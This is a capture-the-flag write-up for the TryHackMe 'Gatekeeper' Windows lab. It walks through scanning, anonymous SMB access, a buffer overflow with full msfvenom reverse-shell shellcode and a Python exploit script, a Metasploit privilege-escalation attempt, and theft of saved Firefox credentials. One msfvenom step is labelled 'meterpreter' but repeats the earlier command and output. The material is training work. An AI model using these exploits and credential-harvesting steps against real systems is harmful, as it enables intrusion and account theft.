| [![Gatekeeper](/_static/images/gatekeeper-room-banner.png)](https://tryhackme.com/room/gatekeeper) |
|:--:|
| [THM Gatekeeper](https://tryhackme.com/room/gatekeeper) |

# Gatekeeper

Can you get past the gate and through the fire?

## Requirements

[A small local lab](https://testlab.tymyrddin.dev/).

## Scanning

    nmap -p- -T4 -Pn $MACHINE_IP
    
    Starting Nmap 7.60 ( https://nmap.org ) at 2022-12-13 13:46 GMT
    Nmap scan report for ip-10-10-110-250.eu-west-1.compute.internal (10.10.110.250)
    Host is up (0.00044s latency).
    Not shown: 65524 closed ports
    PORT      STATE SERVICE
    135/tcp   open  msrpc
    139/tcp   open  netbios-ssn
    445/tcp   open  microsoft-ds
    3389/tcp  open  ms-wbt-server
    31337/tcp open  Elite
    49152/tcp open  unknown
    49153/tcp open  unknown
    49154/tcp open  unknown
    49160/tcp open  unknown
    49161/tcp open  unknown
    49162/tcp open  unknown
    MAC Address: 02:D1:76:28:34:57 (Unknown)
    
    Nmap done: 1 IP address (1 host up) scanned in 1642.77 seconds

## Enumeration

    sudo nmap -p 135,139,445,3389,31337 -sV -sC -v -Pn -T4 $MACHINE_IP

    Starting Nmap 7.60 ( https://nmap.org ) at 2022-12-13 14:17 GMT
    NSE: Loaded 146 scripts for scanning.
    NSE: Script Pre-scanning.
    Initiating NSE at 14:17
    Completed NSE at 14:17, 0.00s elapsed
    Initiating NSE at 14:17
    Completed NSE at 14:17, 0.00s elapsed
    Initiating ARP Ping Scan at 14:17
    Scanning 10.10.110.250 [1 port]
    Completed ARP Ping Scan at 14:17, 0.22s elapsed (1 total hosts)
    Initiating Parallel DNS resolution of 1 host. at 14:17
    Completed Parallel DNS resolution of 1 host. at 14:17, 0.00s elapsed
    Initiating SYN Stealth Scan at 14:17
    Scanning ip-10-10-110-250.eu-west-1.compute.internal (10.10.110.250) [5 ports]
    Discovered open port 31337/tcp on 10.10.110.250
    Completed SYN Stealth Scan at 14:17, 1.24s elapsed (5 total ports)
    Initiating Service scan at 14:17
    Scanning 1 service on ip-10-10-110-250.eu-west-1.compute.internal (10.10.110.250)
    Completed Service scan at 14:20, 146.16s elapsed (1 service on 1 host)
    NSE: Script scanning 10.10.110.250.
    Initiating NSE at 14:20
    Completed NSE at 14:20, 0.01s elapsed
    Initiating NSE at 14:20
    Completed NSE at 14:20, 1.01s elapsed
    Nmap scan report for ip-10-10-110-250.eu-west-1.compute.internal (10.10.110.250)
    Host is up (0.00018s latency).
    
    PORT      STATE    SERVICE       VERSION
    135/tcp   filtered msrpc
    139/tcp   filtered netbios-ssn
    445/tcp   filtered microsoft-ds
    3389/tcp  filtered ms-wbt-server
    31337/tcp open     Elite?
    | fingerprint-strings: 
    |   FourOhFourRequest: 
    |     Hello GET /nice%20ports%2C/Tri%6Eity.txt%2ebak HTTP/1.0
    |     Hello
    |   GenericLines: 
    |     Hello 
    |     Hello
    |   GetRequest: 
    |     Hello GET / HTTP/1.0
    |     Hello
    |   HTTPOptions: 
    |     Hello OPTIONS / HTTP/1.0
    |     Hello
    |   Help: 
    |     Hello HELP
    |   Kerberos: 
    |     Hello !!!
    |   LDAPSearchReq: 
    |     Hello 0
    |     Hello
    |   LPDString: 
    |     Hello 
    |     default!!!
    |   RTSPRequest: 
    |     Hello OPTIONS / RTSP/1.0
    |     Hello
    |   SIPOptions: 
    |     Hello OPTIONS sip:nm SIP/2.0
    |     Hello Via: SIP/2.0/TCP nm;branch=foo
    |     Hello From: <sip:nm@nm>;tag=root
    |     Hello To: <sip:nm2@nm2>
    |     Hello Call-ID: 50000
    |     Hello CSeq: 42 OPTIONS
    |     Hello Max-Forwards: 70
    |     Hello Content-Length: 0
    |     Hello Contact: <sip:nm@nm>
    |     Hello Accept: application/sdp
    |     Hello
    |   SSLSessionReq, TLSSessionReq: 
    |_    Hello
    1 service unrecognized despite returning data. ...
    
    NSE: Script Post-scanning.
    Initiating NSE at 14:20
    Completed NSE at 14:20, 0.00s elapsed
    Initiating NSE at 14:20
    Completed NSE at 14:20, 0.00s elapsed
    Read data files from: /usr/bin/../share/nmap
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 149.29 seconds
               Raw packets sent: 10 (424B) | Rcvd: 2 (72B)

### Interacting with the service on port 31337

    nc $MACHINE_IP 31337


    Hello !!!
    Hi
    Hello Hi!!!

And with a very long string, gets kicked out.

### SMB

Using `smbclient` to list available shares on the host:

    smbclient -L $MACHINE_IP

    Enter WORKGROUP\root's password: 
    
            Sharename       Type      Comment
            ---------       ----      -------
            ADMIN$          Disk      Remote Admin
            C$              Disk      Default share
            IPC$            IPC       Remote IPC
            Users           Disk      
    SMB1 disabled -- no workgroup available

Using `smbclient` to access the `Users` share anonymously:

    smbclient \\\\$MACHINE_IP\\Users

    Enter WORKGROUP\root's password: 
    Try "help" to get a list of possible commands.
    smb: \> ls
      .                                  DR        0  Thu May 14 21:57:08 2020
      ..                                 DR        0  Thu May 14 21:57:08 2020
      Default                           DHR        0  Tue Jul 14 03:07:31 2009
      desktop.ini                       AHS      174  Tue Jul 14 00:54:24 2009
      Share                               D        0  Thu May 14 21:58:07 2020
                      7863807 blocks of size 4096. 3876715 blocks available

    smb: \> cd Share
    smb: \Share\> ls
      .                                   D        0  Thu May 14 21:58:07 2020
      ..                                  D        0  Thu May 14 21:58:07 2020
      gatekeeper.exe                      A    13312  Mon Apr 20 01:27:17 2020
    
                    7863807 blocks of size 4096. 3876715 blocks available

Getting the `gatekeeper.exe` file:

    smb: \Share\> get gatekeeper.exe
    getting file \Share\gatekeeper.exe of size 13312 as gatekeeper.exe (5.1 KiloBytes/sec) (average 5.1 KiloBytes/sec)

Start a web server on the Kali VM in the directory with the files (to download the files to the Windows VM):

    python3 -m http.server

## Exploiting buffer overflow

Get the binary file from the Kali box and follow the [stack-based buffer overflow howto](overflow1.md) 
for creating BoF scripts, with:

    Offset: 146
    JMP ESP address: 080414C3
    Bad characters: 00, 0a

Generate payload with `msfvenom` (`tun0` IP address of KALI on the THM network):

    # msfvenom -p windows/shell_reverse_tcp LHOST=10.18.22.77 LPORT=4444 EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\x00\x0a"
    [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
    [-] No arch selected, selecting arch: x86 from the payload
    Found 1 compatible encoders
    Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
    x86/shikata_ga_nai succeeded with size 351 (iteration=0)
    x86/shikata_ga_nai chosen with final size 351
    Payload size: 351 bytes
    Final size of c file: 1506 bytes
    unsigned char buf[] = 
    "\xda\xcf\xd9\x74\x24\xf4\xb8\x4e\x9a\xa4\x81\x5a\x33\xc9"
    "\xb1\x52\x83\xc2\x04\x31\x42\x13\x03\x0c\x89\x46\x74\x6c"
    "\x45\x04\x77\x8c\x96\x69\xf1\x69\xa7\xa9\x65\xfa\x98\x19"
    "\xed\xae\x14\xd1\xa3\x5a\xae\x97\x6b\x6d\x07\x1d\x4a\x40"
    "\x98\x0e\xae\xc3\x1a\x4d\xe3\x23\x22\x9e\xf6\x22\x63\xc3"
    "\xfb\x76\x3c\x8f\xae\x66\x49\xc5\x72\x0d\x01\xcb\xf2\xf2"
    "\xd2\xea\xd3\xa5\x69\xb5\xf3\x44\xbd\xcd\xbd\x5e\xa2\xe8"
    "\x74\xd5\x10\x86\x86\x3f\x69\x67\x24\x7e\x45\x9a\x34\x47"
    "\x62\x45\x43\xb1\x90\xf8\x54\x06\xea\x26\xd0\x9c\x4c\xac"
    "\x42\x78\x6c\x61\x14\x0b\x62\xce\x52\x53\x67\xd1\xb7\xe8"
    "\x93\x5a\x36\x3e\x12\x18\x1d\x9a\x7e\xfa\x3c\xbb\xda\xad"
    "\x41\xdb\x84\x12\xe4\x90\x29\x46\x95\xfb\x25\xab\x94\x03"
    "\xb6\xa3\xaf\x70\x84\x6c\x04\x1e\xa4\xe5\x82\xd9\xcb\xdf"
    "\x73\x75\x32\xe0\x83\x5c\xf1\xb4\xd3\xf6\xd0\xb4\xbf\x06"
    "\xdc\x60\x6f\x56\x72\xdb\xd0\x06\x32\x8b\xb8\x4c\xbd\xf4"
    "\xd9\x6f\x17\x9d\x70\x8a\xf0\xa8\x96\x82\x4d\xc5\x94\xaa"
    "\x5c\x49\x10\x4c\x34\x61\x74\xc7\xa1\x18\xdd\x93\x50\xe4"
    "\xcb\xde\x53\x6e\xf8\x1f\x1d\x87\x75\x33\xca\x67\xc0\x69"
    "\x5d\x77\xfe\x05\x01\xea\x65\xd5\x4c\x17\x32\x82\x19\xe9"
    "\x4b\x46\xb4\x50\xe2\x74\x45\x04\xcd\x3c\x92\xf5\xd0\xbd"
    "\x57\x41\xf7\xad\xa1\x4a\xb3\x99\x7d\x1d\x6d\x77\x38\xf7"
    "\xdf\x21\x92\xa4\x89\xa5\x63\x87\x09\xb3\x6b\xc2\xff\x5b"
    "\xdd\xbb\xb9\x64\xd2\x2b\x4e\x1d\x0e\xcc\xb1\xf4\x8a\xec"
    "\x53\xdc\xe6\x84\xcd\xb5\x4a\xc9\xed\x60\x88\xf4\x6d\x80"
    "\x71\x03\x6d\xe1\x74\x4f\x29\x1a\x05\xc0\xdc\x1c\xba\xe1"
    "\xf4";

Putting payload in script:

```python
import socket

ip = "10.10.56.225"
port = 31337

offset = 146
overflow = "A" * offset
retn = "\xC3\x14\x04\x08"           # JMP ESP address 080414C3
padding = "\x90"*16
postfix = ""

payload =  (
"\xda\xcf\xd9\x74\x24\xf4\xb8\x4e\x9a\xa4\x81\x5a\x33\xc9"
"\xb1\x52\x83\xc2\x04\x31\x42\x13\x03\x0c\x89\x46\x74\x6c"
"\x45\x04\x77\x8c\x96\x69\xf1\x69\xa7\xa9\x65\xfa\x98\x19"
"\xed\xae\x14\xd1\xa3\x5a\xae\x97\x6b\x6d\x07\x1d\x4a\x40"
"\x98\x0e\xae\xc3\x1a\x4d\xe3\x23\x22\x9e\xf6\x22\x63\xc3"
"\xfb\x76\x3c\x8f\xae\x66\x49\xc5\x72\x0d\x01\xcb\xf2\xf2"
"\xd2\xea\xd3\xa5\x69\xb5\xf3\x44\xbd\xcd\xbd\x5e\xa2\xe8"
"\x74\xd5\x10\x86\x86\x3f\x69\x67\x24\x7e\x45\x9a\x34\x47"
"\x62\x45\x43\xb1\x90\xf8\x54\x06\xea\x26\xd0\x9c\x4c\xac"
"\x42\x78\x6c\x61\x14\x0b\x62\xce\x52\x53\x67\xd1\xb7\xe8"
"\x93\x5a\x36\x3e\x12\x18\x1d\x9a\x7e\xfa\x3c\xbb\xda\xad"
"\x41\xdb\x84\x12\xe4\x90\x29\x46\x95\xfb\x25\xab\x94\x03"
"\xb6\xa3\xaf\x70\x84\x6c\x04\x1e\xa4\xe5\x82\xd9\xcb\xdf"
"\x73\x75\x32\xe0\x83\x5c\xf1\xb4\xd3\xf6\xd0\xb4\xbf\x06"
"\xdc\x60\x6f\x56\x72\xdb\xd0\x06\x32\x8b\xb8\x4c\xbd\xf4"
"\xd9\x6f\x17\x9d\x70\x8a\xf0\xa8\x96\x82\x4d\xc5\x94\xaa"
"\x5c\x49\x10\x4c\x34\x61\x74\xc7\xa1\x18\xdd\x93\x50\xe4"
"\xcb\xde\x53\x6e\xf8\x1f\x1d\x87\x75\x33\xca\x67\xc0\x69"
"\x5d\x77\xfe\x05\x01\xea\x65\xd5\x4c\x17\x32\x82\x19\xe9"
"\x4b\x46\xb4\x50\xe2\x74\x45\x04\xcd\x3c\x92\xf5\xd0\xbd"
"\x57\x41\xf7\xad\xa1\x4a\xb3\x99\x7d\x1d\x6d\x77\x38\xf7"
"\xdf\x21\x92\xa4\x89\xa5\x63\x87\x09\xb3\x6b\xc2\xff\x5b"
"\xdd\xbb\xb9\x64\xd2\x2b\x4e\x1d\x0e\xcc\xb1\xf4\x8a\xec"
"\x53\xdc\xe6\x84\xcd\xb5\x4a\xc9\xed\x60\x88\xf4\x6d\x80"
"\x71\x03\x6d\xe1\x74\x4f\x29\x1a\x05\xc0\xdc\x1c\xba\xe1"
"\xf4"
)

buffer = overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(bytes(buffer + "\r\n", "latin-1"))
    print("Done!")
except socket.error:
    print("[-] Could not connect.")
finally:
    s.close()

```

Start a listener on Kali:

    $ nc -nlvp 4444              
    listening on [any] 4444 ...

Execute exploit:

    $ python3 exploit.py
    Sending evil buffer...
    Done!

Catch it in the listener:

    nc -nlvp 4444
    Ncat: Version 7.93 ( https://nmap.org/ncat )
    Ncat: Listening on :::4444
    Ncat: Listening on 0.0.0.0:4444
    Ncat: Connection from 10.10.56.225.
    Ncat: Connection from 10.10.56.225:49207.
    Microsoft Windows [Version 6.1.7601]
    Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
    
    C:\Users\natbat\Desktop>whoami
    whoami
    gatekeeper\natbat

Get first flag:

    C:\Users\natbat\Desktop>dir
    dir
     Volume in drive C has no label.
     Volume Serial Number is 3ABE-D44B
    
     Directory of C:\Users\natbat\Desktop
    
    05/14/2020  08:24 PM    <DIR>          .
    05/14/2020  08:24 PM    <DIR>          ..
    04/21/2020  04:00 PM             1,197 Firefox.lnk
    04/20/2020  12:27 AM            13,312 gatekeeper.exe
    04/21/2020  08:53 PM               135 gatekeeperstart.bat
    05/14/2020  08:43 PM               140 user.txt.txt
                   4 File(s)         14,784 bytes
                   2 Dir(s)  15,757,553,664 bytes free
    
    C:\Users\natbat\Desktop>type user.txt.txt
    type user.txt.txt

## Privilege escalation

Generate meterpreter payload with `msfvenom` (`tun0` IP address of KALI on the THM network):

    msfvenom -p windows/shell_reverse_tcp LHOST=10.18.22.77 LPORT=4444 EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\x00\x0a"
    [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
    [-] No arch selected, selecting arch: x86 from the payload
    Found 1 compatible encoders
    Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
    x86/shikata_ga_nai succeeded with size 351 (iteration=0)
    x86/shikata_ga_nai chosen with final size 351
    Payload size: 351 bytes
    Final size of c file: 1506 bytes
    unsigned char buf[] = 
    "\xda\xcf\xd9\x74\x24\xf4\xb8\x4e\x9a\xa4\x81\x5a\x33\xc9"
    "\xb1\x52\x83\xc2\x04\x31\x42\x13\x03\x0c\x89\x46\x74\x6c"
    "\x45\x04\x77\x8c\x96\x69\xf1\x69\xa7\xa9\x65\xfa\x98\x19"
    "\xed\xae\x14\xd1\xa3\x5a\xae\x97\x6b\x6d\x07\x1d\x4a\x40"
    "\x98\x0e\xae\xc3\x1a\x4d\xe3\x23\x22\x9e\xf6\x22\x63\xc3"
    "\xfb\x76\x3c\x8f\xae\x66\x49\xc5\x72\x0d\x01\xcb\xf2\xf2"
    "\xd2\xea\xd3\xa5\x69\xb5\xf3\x44\xbd\xcd\xbd\x5e\xa2\xe8"
    "\x74\xd5\x10\x86\x86\x3f\x69\x67\x24\x7e\x45\x9a\x34\x47"
    "\x62\x45\x43\xb1\x90\xf8\x54\x06\xea\x26\xd0\x9c\x4c\xac"
    "\x42\x78\x6c\x61\x14\x0b\x62\xce\x52\x53\x67\xd1\xb7\xe8"
    "\x93\x5a\x36\x3e\x12\x18\x1d\x9a\x7e\xfa\x3c\xbb\xda\xad"
    "\x41\xdb\x84\x12\xe4\x90\x29\x46\x95\xfb\x25\xab\x94\x03"
    "\xb6\xa3\xaf\x70\x84\x6c\x04\x1e\xa4\xe5\x82\xd9\xcb\xdf"
    "\x73\x75\x32\xe0\x83\x5c\xf1\xb4\xd3\xf6\xd0\xb4\xbf\x06"
    "\xdc\x60\x6f\x56\x72\xdb\xd0\x06\x32\x8b\xb8\x4c\xbd\xf4"
    "\xd9\x6f\x17\x9d\x70\x8a\xf0\xa8\x96\x82\x4d\xc5\x94\xaa"
    "\x5c\x49\x10\x4c\x34\x61\x74\xc7\xa1\x18\xdd\x93\x50\xe4"
    "\xcb\xde\x53\x6e\xf8\x1f\x1d\x87\x75\x33\xca\x67\xc0\x69"
    "\x5d\x77\xfe\x05\x01\xea\x65\xd5\x4c\x17\x32\x82\x19\xe9"
    "\x4b\x46\xb4\x50\xe2\x74\x45\x04\xcd\x3c\x92\xf5\xd0\xbd"
    "\x57\x41\xf7\xad\xa1\x4a\xb3\x99\x7d\x1d\x6d\x77\x38\xf7"
    "\xdf\x21\x92\xa4\x89\xa5\x63\x87\x09\xb3\x6b\xc2\xff\x5b"
    "\xdd\xbb\xb9\x64\xd2\x2b\x4e\x1d\x0e\xcc\xb1\xf4\x8a\xec"
    "\x53\xdc\xe6\x84\xcd\xb5\x4a\xc9\xed\x60\x88\xf4\x6d\x80"
    "\x71\x03\x6d\xe1\x74\x4f\x29\x1a\x05\xc0\xdc\x1c\xba\xe1"
    "\xf4";
                                                  
Replacing the shellcode in the script:

```python
import socket

ip = "10.10.56.225"
port = 31337

offset = 146
overflow = "A" * offset
retn = "\xC3\x14\x04\x08"           # JMP ESP address 080414C3
padding = "\x90"*16
postfix = ""

payload =  (
"\xba\xed\xb1\x69\x1e\xd9\xcc\xd9\x74\x24\xf4\x5e\x33\xc9"
"\xb1\x59\x31\x56\x14\x83\xee\xfc\x03\x56\x10\x0f\x44\x95"
"\xf6\x40\xa7\x66\x07\x3e\x21\x83\x36\x6c\x55\xc7\x6b\xa0"
"\x1d\x85\x87\x4b\x73\x3e\x97\xfc\x3e\x18\x96\xfd\x34\x16"
"\xf0\x30\x8b\x7b\x3c\x53\x77\x86\x11\xb3\x46\x49\x64\xb2"
"\x8f\x1f\x02\x5b\x5d\xf7\x67\xf1\x72\x7c\x35\xc9\x73\x52"
"\x31\x71\x0c\xd7\x86\x05\xa0\xd6\xd6\x6e\x60\xf9\x5d\x38"
"\x89\xf8\xb2\xe8\x2c\x33\x40\x34\x66\x4f\x9d\xcf\x49\xb0"
"\xdf\x19\x98\x8e\x21\x6a\xd6\xa2\xa3\xb3\xd1\x5a\xd6\xcf"
"\x21\xe6\xe1\x14\x5b\x3c\x67\x8a\xfb\xb7\xdf\x6e\xfd\x14"
"\xb9\xe5\xf1\xd1\xcd\xa1\x15\xe7\x02\xda\x22\x6c\xa5\x0c"
"\xa3\x36\x82\x88\xef\xed\xab\x89\x55\x43\xd3\xc9\x32\x3c"
"\x71\x82\xd1\x2b\x05\x6b\x2a\x54\x5b\xfb\xe6\x99\x64\xfb"
"\x60\xa9\x17\xc9\x2f\x01\xb0\x61\xa7\x8f\x47\xf0\xaf\x2f"
"\x97\xba\xa0\xd1\x18\xba\xe9\x15\x4c\xea\x81\xbc\xed\x61"
"\x52\x40\x38\x1f\x58\xd6\xc9\xcd\x4a\x6b\xa6\xf3\x72\x62"
"\x6a\x7a\x94\xd4\xc2\x2c\x09\x95\xb2\x8c\xf9\x7d\xd9\x03"
"\x25\x9d\xe2\xce\x4e\x34\x0d\xa6\x27\xa1\xb4\xe3\xbc\x50"
"\x38\x3e\xb9\x53\xb2\xca\x3d\x1d\x33\xbf\x2d\x4a\x24\x3f"
"\xae\x8b\xc1\x3f\xc4\x8f\x43\x68\x70\x92\xb2\x5e\xdf\x6d"
"\x91\xdd\x18\x91\x64\xd7\x53\xa4\xf2\x57\x0c\xc9\x12\x57"
"\xcc\x9f\x78\x57\xa4\x47\xd9\x04\xd1\x87\xf4\x39\x4a\x12"
"\xf7\x6b\x3e\xb5\x9f\x91\x19\xf1\x3f\x6a\x4c\x81\x38\x94"
"\x12\xae\xe0\xfc\xec\xee\x10\xfc\x86\xee\x40\x94\x5d\xc0"
"\x6f\x54\x9d\xcb\x27\xfc\x14\x9a\x8a\x9d\x29\xb7\x4b\x03"
"\x29\x34\x50\xb4\x50\x35\x67\x35\xa5\x5f\x0c\x36\xa5\x5f"
"\x32\x0b\x73\x66\x40\x4a\x47\xdd\x5b\xf9\xea\x74\xf6\x01"
"\xb8\x87\xd3"
)

buffer = overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(bytes(buffer + "\r\n", "latin-1"))
    print("Done!")
except socket.error:
    print("[-] Could not connect.")
finally:
    s.close()

```

Starting `msfconsole`, selecting the multi handler module, and setting and running the exploit:

    sudo msfconsole -q
    [sudo] password for nina: 
    [*] Starting persistent handler(s)...
    msf6 > use exploit/multi/handler
    [*] Using configured payload generic/shell_reverse_tcp
    msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
    payload => windows/meterpreter/reverse_tcp
    msf6 exploit(multi/handler) > set lhost tun0
    lhost => tun0
    msf6 exploit(multi/handler) > set lport 4444
    lport => 4444
    msf6 exploit(multi/handler) > exploit
    
    [*] Started reverse TCP handler on 10.18.22.77:4444 

Executing the script:

    python3 exploit2.py
    Sending evil buffer...
    Done!

And:

    msf6 exploit(multi/handler) > exploit
    
    [*] Started reverse TCP handler on 10.18.22.77:4444 
    [*] Sending stage (175686 bytes) to 10.10.56.225
    [*] Meterpreter session 1 opened (10.18.22.77:4444 -> 10.10.56.225:49210) at 2022-12-14 00:45:32 +0000
    
    meterpreter > 

Backgrounding meterpreter:

    meterpreter > background
    msf6 exploit(multi/handler) > sessions
    
    Active sessions
    ===============
    
      Id  Name  Type                  Information            Connection
      --  ----  ----                  -----------            ----------
      1         meterpreter x86/wind  GATEKEEPER\natbat @ G  10.18.22.77:4444 -> 1
                ows                   ATEKEEPER              0.10.56.225:49210 (10
                                                             .10.56.225)
    msf6 exploit(multi/handler) > sessions
    msf6 exploit(multi/handler) > use windows/local/cve_2019_1458_wizardopium
    msf6 exploit(windows/local/cve_2019_1458_wizardopium) > show options

Trying wizardopium for [CVE-2019-1458](https://www.exploit-db.com/exploits/48180):

    msf6 exploit(multi/handler) > use windows/local/cve_2019_1458_wizardopium
    [*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
    msf6 exploit(windows/local/cve_2019_1458_wizardopium) > show options
    
    Module options (exploit/windows/local/cve_2019_1458_wizardopium):
    
       Name     Current Setting  Required  Description
       ----     ---------------  --------  -----------
       SESSION                   yes       The session to run this module on
     
    Payload options (windows/x64/meterpreter/reverse_tcp):
    
       Name      Current Setting  Required  Description
       ----      ---------------  --------  -----------
       EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thr
                                            ead, process, none)
       LHOST     192.168.122.82   yes       The listen address (an interface may b
                                            e specified)
       LPORT     4444             yes       The listen port

    Exploit target:
    
       Id  Name
       --  ----
       0   Windows 7 x64

    View the full module info with the info, or info -d command.
    
    msf6 exploit(windows/local/cve_2019_1458_wizardopium) > set SESSION 1
    SESSION => 1
    msf6 exploit(windows/local/cve_2019_1458_wizardopium) > set lhost tun0
    lhost => tun0
    msf6 exploit(windows/local/cve_2019_1458_wizardopium) > show options
    
    Module options (exploit/windows/local/cve_2019_1458_wizardopium):
    
       Name     Current Setting  Required  Description
       ----     ---------------  --------  -----------
       SESSION  1                yes       The session to run this module on

    Payload options (windows/x64/meterpreter/reverse_tcp):
    
       Name      Current Setting  Required  Description
       ----      ---------------  --------  -----------
       EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thr
                                            ead, process, none)
       LHOST     tun0             yes       The listen address (an interface may b
                                            e specified)
       LPORT     4444             yes       The listen port

    Exploit target:
    
       Id  Name
       --  ----
       0   Windows 7 x64

    View the full module info with the info, or info -d command.
    
    msf6 exploit(windows/local/cve_2019_1458_wizardopium) > exploit
    
    [*] Started reverse TCP handler on 10.18.22.77:4444 
    [*] Running automatic check ("set AutoCheck false" to disable)
    [+] The target appears to be vulnerable.
    [*] Triggering the exploit...
    [*] Launching msiexec to host the DLL...
    [+] Process 1872 launched.
    [*] Reflectively injecting the DLL into 1872...
    [+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
    [*] Exploit completed, but no session was created.

O dear. Back to the drawing board. Ah.

```text
meterpreter > run post/windows/gather/enum_applications
meterpreter > run post/windows/gather/firefox_creds
```

Then use the [Firefox Decrypt tool from Github](https://github.com/unode/firefox_decrypt), and log in to the `mayor` 
account using `xfreerdp`. The flag is on mayor's Desktop.
